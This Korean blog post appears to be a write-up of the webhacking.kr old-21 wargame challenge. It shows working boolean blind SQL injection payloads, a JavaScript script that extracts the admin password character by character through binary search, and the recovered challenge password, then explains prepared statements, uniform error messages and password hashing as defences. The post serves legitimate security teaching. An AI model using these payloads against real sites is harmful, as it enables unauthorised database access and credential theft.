---
title: "webhacking.kr old-21 풀이 — 응답 세 가지로 만드는 Blind SQL Injection"
description: "로그인 결과를 직접 보여주지 않는 webhacking.kr old-21에서, login success·login fail·wrong password 세 응답의 차이만으로 admin 비밀번호를 한 글자씩 복원하는 과정을 정리한다. 참/거짓 오라클을 세우고 length와 substr·ascii 이진 탐색으로 길이와 각 문자를 알아낸다."
date: 2026-11-11
category: Web
tags: [webhacking.kr, web, wargame, sql-injection, blind-sql-injection, php, mysql]
---

> webhacking.kr은 합법적인 웹 보안 학습용 워게임이다. 이 글은 교육 목적의 풀이이며, 마지막에 같은 취약점을 어떻게 막는지도 함께 정리했다.

[webhacking.kr](https://webhacking.kr)의 old-21 문제를 풀었다. 앞서 다룬 old-18이 입력이 쿼리에 그대로 들어가는 고전적인 SQL 인젝션이었다면, old-21은 한 걸음 더 들어간 Blind SQL Injection이다.

Blind가 붙는 이유는 간단하다. 쿼리 결과를 화면에 보여주지 않기 때문이다. `admin`의 비밀번호를 알아내야 하는데, 서버는 비밀번호는커녕 조회된 행이 있었는지조차 알려주지 않는다. 돌려주는 것은 `login success`, `login fail`, `wrong password` 세 문구뿐이다. 이 세 문구의 미세한 차이만으로 참과 거짓을 가려, 비밀번호를 한 글자씩 복원해 나간다.

## 1. 문제 개요

| 항목 | 값 |
| --- | --- |
| 사이트 | webhacking.kr (old) |
| 문제 | old-21 (`/challenge/bonus-1/`) |
| 배점 | 25점 |
| 유형 | Blind SQL Injection (불리언 기반) |
| 목표 | `admin`의 비밀번호를 알아내 로그인 |

화면에는 `BLIND SQL INJECTION` 이라는 제목과 id/pw 입력창, 결과를 보여 줄 `Result :` 칸이 있다. 폼은 값을 GET으로 `index.php`에 보낸다.

```html
<form method="get" action="index.php">
  id : <input name="id" size="30">
  pw : <input name="pw" size="30"> <input type="submit">
  Result : <b></b>
</form>
```

우리가 만질 수 있는 입력은 `?id=...&pw=...` 두 개, 관찰할 수 있는 출력은 `Result :` 한 줄이 전부다.

## 2. 응답 관찰 — 세 가지 문구와 pw의 함정

먼저 정상 입력으로 서버가 어떤 문구를 돌려주는지 살펴봤다. 아래는 모두 실제 응답이다.

| 요청 | `Result :` |
| --- | --- |
| `?id=guest&pw=guest` | login success |
| `?id=guest&pw=123` | login fail |
| `?id=admin&pw=123` | login fail |
| `?id=admin&pw=0` | *(빈칸 — 아무것도 안 나옴)* |

여기서 두 가지가 드러난다. 하나는 문구가 세 종류라는 점(`login success`, `login fail`, 그리고 곧 보게 될 `wrong password`)이다. 다른 하나는 `pw=0`이면 결과가 통째로 비어 버린다는 점이다. 로그인 로직 자체가 돌지 않는다는 뜻인데, PHP에서 문자열 `"0"`은 거짓으로 취급되므로 서버 코드가 `if($_GET['pw']) { ... }` 꼴로 pw가 있을 때만 로직을 타는 것으로 보인다. 그래서 이후 모든 페이로드에서는 pw 자리에 `0`이나 빈값이 아닌 값(여기서는 `pw=1`)을 둔다.

이제 `id`에 따옴표를 넣어 인젝션 여부를 확인한다.

| 요청 | `Result :` | 해석 |
| --- | --- | --- |
| `?id=admin'&pw=1` | login fail | 따옴표 하나로 쿼리가 깨짐(문법 오류) → 조회 실패 |
| `?id=admin' -- -&pw=1` | wrong password | 뒤를 주석 처리 → `id='admin'` 행이 조회됨 |

따옴표 하나만 넣으면 쿼리가 깨져 `login fail`이 되지만, `-- -`로 뒤를 주석 처리해 쿼리를 온전하게 닫으면 `wrong password`가 나온다. 따옴표가 이스케이프되지 않고 그대로 쿼리에 들어간다는 뜻이고, 인젝션이 성립한다.

## 3. 오라클 세우기 — "wrong password" vs "login fail"

관찰한 세 응답을 의사 코드로 정리하면 이렇다. webhacking.kr은 이 문제의 서버 소스를 공개하지 않으므로, 아래는 응답 동작으로부터 복원한 추정 코드다.

```php
<?php
$id = $_GET['id'];  $pw = $_GET['pw'];
if ($pw) {                                     // pw 가 falsy('0'/'')면 통째로 건너뜀 → 빈 결과
  $row = query("select id from member where id='$id'");   // ← id 가 그대로 삽입된다
  if (!$row) {
    echo "login fail";                         // 조회된 행이 없음
  } else if ($row['pw_matches']) {             // (행이 있고) 비밀번호도 맞음
    echo "login success";
  } else {
    echo "wrong password";                     // 행은 있는데 비밀번호가 틀림
  }
}
?>
```

핵심은 `id`를 넣는 순간, 행이 조회되느냐 마느냐가 문구로 새어 나온다는 것이다.

- 내가 넣은 조건이 참이면 `admin` 행이 조회되고, 비밀번호 `1`은 당연히 틀리니 `wrong password`가 나온다.
- 조건이 거짓이면 조회되는 행이 없어 `login fail`이 나온다.

이것을 `id`에 `and (조건)`을 끼워 넣어 검증했다.

| 요청 (`pw=1`) | `Result :` | 판정 |
| --- | --- | --- |
| `id=admin' and '1'='1' -- -` | wrong password | 참 |
| `id=admin' and '1'='2' -- -` | login fail | 거짓 |

깔끔하게 갈린다. 참이면 `wrong password`, 거짓이면 `login fail`이라는 불리언 오라클이 생겼다. 이제 질문을 `admin`의 비밀번호에 대한 것으로 바꾸기만 하면 된다.

## 4. 길이부터 — `length(pw)`

한 글자씩 뽑기 전에 비밀번호 길이를 먼저 알아야 어디까지 읽을지 정할 수 있다. `length(pw) <= N`을 이진 탐색하면 요청 몇 번으로 길이가 나온다.

```
id=admin' and length(pw)=36 -- -&pw=1   → wrong password   (참)
id=admin' and length(pw)=35 -- -&pw=1   → login fail        (거짓)
```

비밀번호 길이는 36자로 확정됐다.

## 5. 한 글자씩 — `substr` + `ascii` 이진 탐색

이제 i번째 글자를 알아낸다. `substr(pw, i, 1)`로 i번째 한 글자를 떼고, 그 글자의 코드값 `ascii(...)`를 이진 탐색으로 좁힌다. 문자당 `=`로 하나씩 물어보면 출력 가능한 ASCII 기준 최대 95번이 들지만, `>`로 범위를 반씩 쪼개면 7번이면 충분하다.

```
id=admin' and substr(pw,1,1)='t'       -- -&pw=1   → wrong password   (참: 1번째 글자는 t)
id=admin' and substr(pw,1,1)='x'       -- -&pw=1   → login fail        (거짓)
id=admin' and ascii(substr(pw,1,1))=116 -- -&pw=1  → wrong password   (참: 't' = 0x74 = 116)
```

이 질문을 1번째부터 36번째 글자까지, 각 글자마다 ascii 값을 이진 탐색으로 좁히며 반복한다. 실제로는 아래 스크립트를 문제 페이지 콘텍스트에서 돌려 자동화했다. 응답에 `wrong password`가 있으면 참으로 본다.

```js
const base = 'https://webhacking.kr/challenge/bonus-1/index.php';

// 조건이 참이면 true (wrong password), 거짓이면 false (login fail)
async function isTrue(cond) {
  const id = "admin' and (" + cond + ") -- -";
  const u = base + '?id=' + encodeURIComponent(id) + '&pw=1';
  const t = await (await fetch(u, { credentials: 'include' })).text();
  return /wrong password/.test(t);
}

let pw = "";
for (let i = 1; i <= 36; i++) {
  let lo = 32, hi = 126;                 // 출력 가능한 ASCII 범위
  while (lo < hi) {
    const mid = (lo + hi) >> 1;
    if (await isTrue(`ascii(substr(pw,${i},1))>${mid}`)) lo = mid + 1;
    else hi = mid;
  }
  pw += String.fromCharCode(lo);
}
console.log(pw);
```

돌리면 36자가 그대로 복원된다.

```text
there_is_no_rest_for_the_white_angel
```

## 6. 결과 — 복원한 비밀번호로 admin 로그인

이제 블라인드가 아니라 진짜 로그인이다. 알아낸 비밀번호를 그대로 넣는다.

```text
GET /challenge/bonus-1/index.php?id=admin&pw=there_is_no_rest_for_the_white_angel
→ Result : old-21 Pwned. You got 25point. Congratz!
```

`alert('old-21 Pwned!')`가 뜨고 점수가 올랐으며, `chall.php`에서도 `✔️ old-21`로 풀린 것을 확인했다. 비밀번호가 맞으니 이번엔 `wrong password`가 아니라 통과 처리가 돌아온 것이다.

서버는 끝까지 비밀번호를 보여준 적이 없다. 맞는 행이 있는지 없는지를 문구 하나로 흘렸을 뿐인데, 그 한 비트가 36번 쌓이자 36자가 전부 드러났다.

## 7. 왜 취약한가 — 그리고 올바른 방어

**근본 원인은 입력을 쿼리 문자열에 섞은 것이다.** `where id='$id'`처럼 입력을 직접 끼워 넣으면 따옴표 하나로 쿼리의 구조가 바뀐다. 해법은 old-18과 같다. 파라미터 바인딩(prepared statement)으로 입력을 구조가 아니라 데이터로만 다루면 된다.

```php
$stmt = $db->prepare("select pw from member where id=?");
$stmt->bind_param("s", $_GET['id']);   // id 는 데이터로만 바인딩
$stmt->execute();
```

**응답 문구 자체가 정보 유출 채널이다.** `login success`, `login fail`, `wrong password`처럼 상태마다 다른 메시지를 주면, 결과를 직접 보여주지 않아도 참/거짓 한 비트가 매번 새어 나간다. Blind 인젝션은 그 한 비트를 먹고 자란다. 로그인 실패는 "아이디 없음"과 "비밀번호 틀림"을 구분하지 말고 하나의 문구로 통일한다. 사용자 열거(enumeration)도 함께 막힌다.

**비밀번호는 평문이 아니라 해시로 저장한다.** `there_is_no_rest_for_the_white_angel`처럼 비밀번호가 평문으로 조회·비교된다는 것 자체가 위험이다. `password_hash()`로 저장하고 `password_verify()`로만 검증하면, 설령 한 글자씩 새더라도 나오는 것은 해시값이라 그대로 로그인에 쓸 수 없다.

## 8. 정리

- old-21은 결과를 보여주지 않는 Blind SQL Injection이다. 돌려주는 건 `login success`/`login fail`/`wrong password` 세 문구뿐이다.
- `pw`가 `0`이나 빈값이면 PHP의 falsy 판정으로 로직이 통째로 건너뛰어 결과가 빈다. 그래서 페이로드의 pw 자리에는 truthy 값(`1`)을 둔다.
- `id`에 `admin' and (조건) -- -`을 넣으면, 참이면 `wrong password`(admin 행 조회됨), 거짓이면 `login fail`(행 없음)로 갈린다. 이 차이가 불리언 오라클이다.
- `length(pw)`로 길이(36)를, `ascii(substr(pw,i,1))` 이진 탐색으로 각 글자를 복원해 비밀번호 `there_is_no_rest_for_the_white_angel`를 얻고 admin으로 로그인했다.
- 방어는 prepared statement, 실패 메시지 단일화, 해시 기반 비밀번호 세 가지다.

결과를 숨겼으니 안전하다는 생각이 이 문제의 함정이다. 참과 거짓을 다르게 응답하는 순간, 숨긴 데이터는 한 번에 한 비트씩 빠져나온다.

---

*본문의 요청·응답은 webhacking.kr old-21에서 직접 확인한 결과다.*
